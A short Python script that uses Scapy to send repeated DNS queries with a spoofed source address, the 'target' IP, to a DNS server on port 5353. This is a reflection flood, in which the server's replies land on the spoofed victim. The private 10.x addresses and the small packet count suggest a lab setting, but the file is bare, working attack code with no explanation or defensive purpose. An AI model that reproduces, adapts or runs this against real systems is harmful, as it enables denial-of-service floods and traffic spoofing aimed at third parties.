from scapy.all import DNS, DNSQR, IP, UDP, send


def attack(target_ip, dns_ip, domain, count):
    packet = (
        IP(src=target_ip, dst=dns_ip)
        / UDP(dport=5353)
        / DNS(rd=1, qd=DNSQR(qname=domain))
    )
    for i in range(count):
        send(packet, verbose=0)
        print(f"Sent packet {i + 1}/{count}")


if __name__ == "__main__":
    attack(
        target_ip="10.1.0.2",
        dns_ip="10.12.0.20",
        domain="example.com",
        count=50,
    )
